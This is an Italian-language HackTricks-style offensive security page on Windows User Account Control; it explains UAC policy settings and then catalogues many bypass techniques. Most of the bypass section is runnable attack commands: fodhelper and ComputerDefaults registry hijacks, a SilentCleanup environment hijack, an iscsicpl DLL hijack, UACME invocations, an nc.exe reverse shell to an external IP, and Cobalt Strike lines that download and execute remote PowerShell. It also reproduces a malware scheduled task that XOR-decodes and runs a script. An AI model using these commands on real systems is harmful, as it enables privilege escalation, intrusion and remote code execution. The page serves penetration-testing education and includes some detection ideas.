# UAC - Controllo dell'account utente

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con privilegi elevati**. Le applicazioni hanno diversi livelli di `integrity` e un programma con un **livello elevato** può eseguire attività che **potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e le attività vengono sempre **eseguite nel contesto di sicurezza di un account non amministratore**, a meno che un amministratore non autorizzi esplicitamente queste applicazioni/attività ad accedere al sistema con privilegi di amministratore. È una funzionalità pratica che protegge gli amministratori da modifiche involontarie, ma non è considerata un confine di sicurezza.<sup>[[2]](#references)</sup>

Per maggiori informazioni sui livelli di integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono assegnati 2 token: un token utente standard, per eseguire le normali azioni con integrity media, e uno con i privilegi di amministratore.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) illustra in dettaglio il funzionamento di UAC e include il processo di accesso, l'esperienza utente e l'architettura di UAC.<sup>[[2]](#references)</sup> Gli amministratori possono usare i criteri di sicurezza per configurare il funzionamento di UAC in base alle esigenze della propria organizzazione a livello locale (usando secpol.msc), oppure configurarli e distribuirli tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono illustrate in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Per UAC sono disponibili 10 impostazioni di Group Policy. La tabella seguente fornisce ulteriori dettagli:

| Impostazione di Group Policy                                                                                                                                                                                                                                                                                                                                                           | Chiave di registro                | Impostazione predefinita                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Controllo dell'account utente: Modalità di approvazione amministratore per l'account Amministratore predefinito](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabilitato)                                             |
| [Controllo dell'account utente: Comportamento della richiesta di elevazione per gli amministratori in modalità di approvazione amministratore](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Richiedi il consenso per i file binari non Windows sul desktop protetto) |
| [Controllo dell'account utente: Comportamento della richiesta di elevazione per gli utenti standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Richiedi le credenziali sul desktop protetto)         |
| [Controllo dell'account utente: Rileva le installazioni di applicazioni e richiedi l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Abilitato; disabilitato per impostazione predefinita in Enterprise)           |
| [Controllo dell'account utente: Eleva solo i file eseguibili firmati e con firma convalidata](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabilitato)                                             |
| [Controllo dell'account utente: Eleva solo le applicazioni UIAccess installate in percorsi sicuri](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Abilitato)                                              |
| [Controllo dell'account utente: Esegui tutti gli amministratori in modalità di approvazione amministratore](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Abilitato)                                              |
| [Controllo dell'account utente: Consenti alle applicazioni UIAccess di richiedere l'elevazione senza usare il desktop protetto](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabilitato)                                             |
| [Controllo dell'account utente: Passa al desktop protetto quando viene richiesta l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Abilitato)                                              |
| [Controllo dell'account utente: Virtualizza gli errori di scrittura di file e registro in percorsi specifici per utente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Abilitato)                                              |

### Criteri per l'installazione di software in Windows

I **criteri di sicurezza locali** (in genere "secpol.msc" nella maggior parte dei sistemi) sono configurati per impostazione predefinita per **impedire agli utenti non amministratori di installare software**. Ciò significa che, anche se un utente non amministratore può scaricare il programma di installazione del software, non potrà eseguirlo senza un account amministratore.

### Chiavi di registro per forzare UAC a richiedere l'elevazione

In qualità di utente standard senza diritti di amministratore, puoi fare in modo che all'account "standard" **vengano richieste le credenziali da UAC** quando tenta di eseguire determinate azioni. Per farlo è necessario modificare alcune **chiavi di registro**, operazione per cui sono necessari i permessi di amministratore, a meno che non sia presente un **UAC bypass** o che l'attaccante abbia già effettuato l'accesso come amministratore.

Anche se l'utente appartiene al gruppo **Administrators**, queste modifiche obbligano l'utente a **inserire nuovamente le credenziali del proprio account** per eseguire azioni amministrative.

**In pratica, è utile solo se si dispone già di un token elevato, di un UAC bypass o di una configurazione errata che consente di modificare queste chiavi; altrimenti, la scrittura nel registro viene bloccata.**

Le chiavi e le voci di registro da modificare sono le seguenti (con i rispettivi valori predefiniti tra parentesi):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

È possibile farlo anche manualmente tramite lo strumento Criteri di sicurezza locali. Una volta modificate le impostazioni, per le operazioni amministrative viene richiesto all'utente di inserire nuovamente le proprie credenziali.

### Nota

**User Account Control non è un confine di sicurezza.** Pertanto, gli utenti standard non possono uscire dai propri account e ottenere privilegi di amministratore senza un exploit di local privilege escalation.

### Richiedere a un utente l'"accesso completo al computer"

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Privilegi UAC

- La Modalità protetta di Internet Explorer usa controlli di integrità per impedire ai processi con un livello di integrità elevato (come i browser web) di accedere a dati con un livello di integrità basso (come la cartella dei file temporanei di Internet). Questo avviene eseguendo il browser con un token a bassa integrità. Quando il browser tenta di accedere ai dati archiviati nella zona a bassa integrità, il sistema operativo controlla il livello di integrità del processo e consente l'accesso di conseguenza. Questa funzionalità aiuta a impedire che gli attacchi di remote code execution accedano a dati sensibili nel sistema.
- Quando un utente accede a Windows, il sistema crea un token di accesso contenente un elenco dei privilegi dell'utente. I privilegi sono definiti come la combinazione dei diritti e delle capacità di un utente. Il token contiene anche un elenco delle credenziali dell'utente, usate per autenticare l'utente nel computer e nelle risorse della rete.

### Autoadminlogon

Per configurare Windows in modo che acceda automaticamente a un utente specifico all'avvio, imposta la **chiave di registro `AutoAdminLogon`**. Questa opzione è utile negli ambienti kiosk o a scopo di test. Usala solo su sistemi sicuri, poiché espone la password nel registro.

Imposta le seguenti chiavi usando l'Editor del Registro di sistema o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Per ripristinare il comportamento normale di accesso, imposta `AutoAdminLogon` su 0.

## UAC bypass

> [!TIP]
> Nota che, se hai accesso grafico alla vittima, eseguire un UAC bypass è semplice: puoi fare clic su "Sì" quando compare la richiesta UAC.

L'UAC bypass è necessario nella seguente situazione: **l'UAC è attivato, il tuo processo è in esecuzione in un contesto di integrità media e il tuo utente appartiene al gruppo degli amministratori**.

È importante sottolineare che **è molto più difficile eseguire un UAC bypass se il livello di sicurezza è il più alto (Always) rispetto a qualsiasi altro livello (Default).**

### Triage rapido da una shell a integrità media

Prima di provare un bypass, verifica di trovarti nello scenario corretto e individua la build dell'host per confrontarla con i metodi noti:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Note pratiche:
- Se `EnableLUA=0`, non serve un bypass: qualsiasi token admin può richiedere direttamente un livello di integrità elevato.
- `ConsentPromptBehaviorAdmin=2` o `5` è lo scenario comune per i bypass basati su auto-elevate / COM.
- `Always Notify` alza l'asticella, ma dovresti comunque testare la build esatta invece di presumere che il bypass fallisca: UACME continua a tracciare alcuni metodi compatibili con `AlwaysNotify` nelle build moderne di Windows.<sup>[[3]](#references)</sup>

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**), puoi **eseguire una reverse shell con privilegi admin** (livello di integrità elevato) usando qualcosa come:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass con duplicazione del token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### RPC locale + oggetto di debug riutilizzabile

L'interfaccia RPC locale di AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` può creare un processo con il debugging abilitato. I processi creati tramite debugging sullo stesso thread condividono l'oggetto di debug del thread; un evento di creazione con debugging include un handle di processo con accesso completo, anche quando il risultato RPC concede solo un accesso limitato. Questo rende il riutilizzo dell'oggetto di debug una tecnica UAC per un utente con integrità media appartenente al gruppo Administrators.<sup>[[11]](#references)[[12]](#references)</sup>

Una sequenza pratica è:<sup>[[11]](#references)[[12]](#references)</sup>

1. Chiama il metodo RPC locale (direttamente o tramite `NdrAsyncClientCall`) per creare un processo sacrificabile non elevato con il debugging abilitato.
2. Interroga `ProcessDebugObjectHandle` con `NtQueryInformationProcess`, scollega l'oggetto con `NtRemoveProcessDebug`, conserva l'oggetto e termina il processo sacrificabile.
3. Usa la stessa interfaccia RPC per creare un processo attendibile con auto-elevazione, quindi associa l'oggetto salvato al thread chiamante tramite `DbgUiSetThreadDebugObject`.
4. Chiama `WaitForDebugEvent` e acquisisci l'handle del processo dall'evento `CREATE_PROCESS_DEBUG_EVENT`; duplicalo con `NtDuplicateObject` prima di continuare.
5. Passa l'handle duplicato a `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` e avvia il payload con una struttura estesa di startup-info. In questo modo riutilizzi il contesto del processo elevato e assegni al processo figlio una relazione con un processo padre dall'aspetto attendibile.

Cerca la breve sequenza, non soltanto il binario con auto-elevazione: creazione di processi tramite RPC locale di AppInfo, query di `ProcessDebugObjectHandle`, scollegamento/riassociazione del debugger, un evento di creazione con debugging immediato, duplicazione dell'handle e un processo figlio il cui processo padre registrato non corrisponde al processo che ha eseguito le API di creazione.<sup>[[12]](#references)</sup>

### **Molto** semplice "bypass" UAC (accesso completo al file system)

Se hai una shell con un utente appartenente al gruppo Administrators, puoi **montare la condivisione C$** tramite SMB (file system) in locale su una nuova unità e avrai **accesso a tutto il file system** (inclusa la cartella home di Administrator).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass con Cobalt Strike

Le tecniche di Cobalt Strike funzionano solo se UAC non è impostato sul livello di sicurezza massimo.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** e **Metasploit** dispongono anche di diversi moduli per **bypassare** l'**UAC**.

### Interfacce COM con elevazione automatica (`ICMLuaUtil` / `CMSTPLUA`)

Gli oggetti COM con elevazione automatica restano una superficie UAC pratica nelle versioni moderne. UACME continua a indicare `ICMLuaUtil` come funzionante nelle versioni attuali di Windows, e gli strumenti offensivi continuano ad adattare `CMSTPLUA` combinando un processo desktop interattivo, l'esecuzione a 64 bit e, talvolta, il mascheramento di PEB/processo prima di richiamare il COM Elevation Moniker.<sup>[[3]](#references)</sup>

Consigli pratici:
- Preferisci un processo a **64 bit** nella **sessione interattiva** dell'utente (comunemente `explorer.exe` o un suo processo figlio).
- Se una shell grezza non funziona, riprova usando un'implementazione BOF / UACME anziché un wrapper `CreateProcess` ingenuo.
- Prevedi che il processo figlio venga eseguito in un **processo separato con privilegi elevati**; molti BOF non elevano il beacon corrente sul posto.

### KRBUACBypass

Documentazione e tool disponibili in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploit per il bypass di UAC

[**UACME**](https://github.com/hfiref0x/UACME) è una raccolta di tecniche per il bypass di UAC. Compilalo con Visual Studio o MSBuild; la compilazione crea diversi eseguibili (ad esempio, `Source\Akagi\output\x64\Debug\Akagi.exe`), quindi seleziona il metodo appropriato per la build di destinazione.<sup>[[3]](#references)</sup>\
Fai attenzione: alcuni bypass avviano programmi o prompt visibili che possono allertare l'utente.<sup>[[3]](#references)</sup>

UACME indica la **versione della build a partire dalla quale ciascuna tecnica ha iniziato a funzionare**.<sup>[[3]](#references)</sup> Puoi cercare una tecnica che interessi le tue versioni:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Inoltre, usando [questa](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina, puoi ricavare la release di Windows `1607` dalle versioni della build.

Un flusso di lavoro pratico consiste prima nel **valutare la build dell'host** e solo dopo eseguire il metodo corrispondente:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` confronta rapidamente la build locale con i metodi UAC noti, il che è utile per scartare velocemente i PoC non più validi.<sup>[[4]](#references)</sup>
- `UACME` resta il miglior catalogo pubblico per associare un bypass a una build precisa. La versione 3.7.1 ha aggiunto i metodi 83–85, mentre la release precedente ha ritestato i metodi esistenti con **Windows 11 25H2**; ricontrolla la tabella dei metodi e le note di rilascio invece di presumere che un vecchio PoC sia ancora applicabile senza modifiche.<sup>[[3]](#references)[[9]](#references)</sup>

### Catene WNF/UIAccess compatibili con Always Notify (UACME 3.7.1)

`Always Notify` non elimina tutti i bypass UAC. UACME 3.7.1 implementa tre nuovi metodi x64 che combinano stato di ambiente/protocollo controllabile dall'utente con il comportamento di attività pianificate con privilegi elevati o UIAccess, e li contrassegna tutti come `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** reindirizza `SystemRoot` in modo che l'attività `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, attivata da WNF, faccia eseguire a `taskhostw.exe` con privilegi elevati il side-load di `unifiedconsent.dll`. UACME lo supporta a partire dalla build 19041 di Windows 10.
- **84 — TabTip:** usa la stessa primitiva basata sulle variabili d'ambiente con `TabTip.exe` dotato di UIAccess, che carica `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` o `rsaenh.dll` a seconda della build, quindi sfrutta il contesto UIAccess a elevata integrità risultante. UACME lo supporta a partire da Windows 8.1 / Server 2016.
- **85 — Narrator:** dirotta il protocollo `feedback-hub` specifico dell'utente, controlla Narrator con `Alt+CapsLock+F`, quindi avvia una copia scrivibile di `osk.exe` che esegue il side-load di `OskSupport.dll`. È necessario un desktop interattivo; UACME lo supporta a partire da Windows 10 1809 / Server 2019.

Dopo aver creato le unità payload e Akagi come documentato da UACME, richiama il numero del metodo corrispondente (il comando opzionale predefinito è `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

I metodi 84 e 85 dipendono da UIAccess/interazione con il desktop, quindi non aspettarti che funzionino senza modifiche da Session 0 o da una shell di servizio non interattiva. Tutti e tre modificano lo stato dell’ambiente/protocollo e predispongono DLL; esamina l’implementazione e rimuovi questi artefatti dopo i test.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (dirottamento del Registro)

Il binario attendibile `fodhelper.exe` viene eseguito automaticamente con privilegi elevati nelle versioni moderne di Windows. Quando viene avviato, consulta il percorso del Registro per utente riportato di seguito senza convalidare il verbo `DelegateExecute`. Inserire un comando in quel percorso consente a un processo con integrità media (l’utente appartiene al gruppo Administrators) di avviare un processo con integrità elevata senza una richiesta UAC.

Percorso del Registro consultato da fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Passaggi di PowerShell (imposta il payload, quindi attivalo)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Note:
- Funziona quando l'utente corrente è membro di Administrators e il livello UAC è predefinito/tollerante (non Always Notify con restrizioni aggiuntive).
- Usa il percorso `sysnative` per avviare PowerShell a 64 bit da un processo a 32 bit su Windows a 64 bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd o un percorso EXE). Per operare in modo furtivo, evita le interfacce utente che mostrano prompt.

#### Trigger `ComputerDefaults.exe` per lo stesso handler `ms-settings`

`ComputerDefaults.exe` risolve la stessa associazione per utente `ms-settings\Shell\Open\command` di `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Dopo aver impostato il comando predefinito e il valore `DelegateExecute` vuoto come sopra, usa `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` come trigger alternativo; non ripetere la configurazione del registro.<sup>[[13]](#references)[[14]](#references)</sup> I prerequisiti relativi all'amministratore con integrità media e ai criteri UAC indicati sopra per `fodhelper.exe` restano validi.<sup>[[2]](#references)[[3]](#references)</sup> UACME cataloga questo trigger a partire da Windows 10 RS4 (build 17134), quindi verificalo sulla build di destinazione.<sup>[[3]](#references)</sup>

#### Variante di hijack CurVer/estensione (solo HKCU)

Campioni recenti che abusano di `fodhelper.exe` evitano `DelegateExecute` e invece **reindirizzano il ProgID `ms-settings`** tramite il valore `CurVer` per utente. Il binario auto-elevato risolve comunque l'handler in `HKCU`, quindi non serve un token amministrativo per creare le chiavi:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Una volta ottenuti privilegi elevati, il malware **disabilita comunemente le richieste future** impostando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` su `0`, quindi esegue ulteriori operazioni di evasione delle difese (ad es., `Add-MpPreference -ExclusionPath C:\ProgramData`) e ricrea la persistenza per essere eseguito con integrità elevata. Una tipica attività di persistenza memorizza su disco uno **script PowerShell cifrato con XOR** e lo decodifica ed esegue in memoria ogni ora:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Questa variante rimuove comunque il dropper e lascia solo i payload staged, quindi il rilevamento si basa sul monitoraggio del **`CurVer` hijack**, della manomissione di `ConsentPromptBehaviorAdmin`, della creazione di esclusioni in Defender o di attività pianificate che decrittano PowerShell in memoria.<sup>[[5]](#references)</sup>

### UAC bypass tramite attività `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` avvia `cleanmgr.exe` con i privilegi più elevati ed espande `%windir%` dall'ambiente dell'utente. Se controlli `HKCU\Environment\windir`, puoi reindirizzare tale espansione a un comando arbitrario e ottenere un livello di integrità elevato senza una finestra di dialogo di consenso.<sup>[[8]](#references)</sup> Vale ancora la pena testare questo metodo nelle build recenti, perché UACME mantiene attiva la tecnica e il monitoraggio recente delle issue indica che Windows 11 24H2 potrebbe richiedere solo piccoli aggiustamenti delle virgolette.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Se l’attività cita il percorso in quella build, riprova con un payload che termina con una virgoletta (ad esempio `cmd.exe"`). Dopo i test, elimina sempre `HKCU\Environment\windir`.

#### Altri bypass UAC

Molti bypass UAC classici che sfruttano flussi dell’interfaccia, oggetti COM o interazioni con il desktop richiedono una **sessione interattiva completa** con la vittima; una shell comune ottenuta con `nc.exe` o un servizio in **Session 0** spesso non basta.

Spesso puoi risolvere il problema usando una sessione **meterpreter**. Esegui la migrazione verso un **processo** il cui valore **Session** è uguale a **1**:

![Imposta ms-settings su un'estensione personalizzata (.thm) e associa quell'estensione al nostro payload - Altri bypass UAC: puoi riuscirci usando una sessione meterpreter. Esegui la migrazione verso un processo il cui valore Session...](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### Bypass UAC con GUI

Se hai accesso a una **GUI, puoi semplicemente accettare la richiesta UAC** quando compare; non ti serve davvero un bypass tecnico. Pertanto, ottenere una sessione GUI spesso basta a superare gli ostacoli pratici introdotti da UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente tramite RDP), **alcuni strumenti saranno in esecuzione come amministratore** e da lì potresti **eseguire**, ad esempio, un **cmd** direttamente **come admin** senza che UAC ti chieda nuovamente conferma, come nel caso di [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **stealthy**.

### Bypass UAC con brute-force rumoroso

Se il rumore è accettabile, uno strumento come [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) può richiedere ripetutamente l'elevazione finché l'utente non la accetta.

### Il tuo bypass - Metodologia di base per il bypass UAC

Se dai un'occhiata a **UACME**, noterai che **molti bypass UAC sfruttano il DLL hijacking** (spesso facendo caricare a un binario con privilegi elevati una DLL controllata dall'attaccante da un percorso scrivibile). [Leggi qui per scoprire come trovare una vulnerabilità di DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binario che esegue **autoelevate** (verifica che, quando viene eseguito, funzioni con un livello di integrità elevato).
2. Con procmon, cerca gli eventi "**NAME NOT FOUND**" che potrebbero essere vulnerabili al **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL in alcuni **percorsi protetti** (come C:\Windows\System32), per i quali non hai i permessi di scrittura. Puoi aggirare il problema usando:
   1. **wusa.exe**: Windows 7, 8 e 8.1. Consente di estrarre il contenuto di un file CAB in percorsi protetti (perché questo strumento viene eseguito con un livello di integrità elevato).
   2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la DLL nel percorso protetto ed eseguire il binario vulnerabile con autoelevazione.

### Un'altra tecnica di bypass UAC

Consiste nel verificare se un **binario autoElevated** prova a **leggere** dal **registro** il **nome/percorso** di un **binario** o **comando** da **eseguire** (è più interessante se il binario cerca queste informazioni in **HKCU**).

### Bypass UAC tramite `SysWOW64\iscsicpl.exe` + DLL hijack tramite `PATH` utente

Il binario a 32 bit `C:\Windows\SysWOW64\iscsicpl.exe` è **auto-elevato** e può essere sfruttato per caricare `iscsiexe.dll` in base all'ordine di ricerca. Se riesci a inserire una `iscsiexe.dll` malevola in una cartella **scrivibile dall'utente** e poi modificare il `PATH` dell'utente corrente (ad esempio tramite `HKCU\Environment\Path`) in modo che venga cercata quella cartella, Windows potrebbe caricare la DLL dell'attaccante nel processo `iscsicpl.exe` con privilegi elevati **senza mostrare una richiesta UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Note pratiche:
- È utile quando l'utente corrente appartiene al gruppo **Administrators**, ma è in esecuzione con **Medium Integrity** a causa di UAC.
- Per questo bypass è rilevante la copia in **SysWOW64**. Considera la copia in **System32** un binario distinto e verifica il comportamento separatamente.
- La primitiva combina **auto-elevazione** e **DLL search-order hijacking**, quindi il workflow ProcMon usato per altri bypass UAC è utile per verificare il caricamento della DLL mancante.

Flusso minimo:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Idee per il rilevamento:
- Generare un alert per `reg add` / scritture nel registro in `HKCU\Environment\Path` seguite immediatamente dall'esecuzione di `C:\Windows\SysWOW64\iscsicpl.exe`.
- Cercare `iscsiexe.dll` in percorsi **controllati dall'utente**, come `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlare gli avvii di `iscsicpl.exe` con processi figlio imprevisti o caricamenti di DLL da percorsi esterni alle normali directory di Windows.

### Ricerche più recenti da verificare separatamente

Alcune chain successive al 2024 non assomigliano più ai classici registry hijack di `HKCU\Software\Classes`. Per esempio, il poisoning della cache del contesto di attivazione può combinare un **rimappamento dell'unità** e una **DLL redirection** per passare da un livello di integrità medio a uno elevato tramite UI attendibili / binari con elevazione automatica come `ctfmon.exe` e, successivamente, target come `fodhelper.exe`. Invece di duplicare qui il lungo PoC, consulta gli esempi compatti di payload in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack della lettera di unità tramite la mappa dei dispositivi DOS per sessione di logon di Administrator Protection (anteprima)

> [!NOTE]
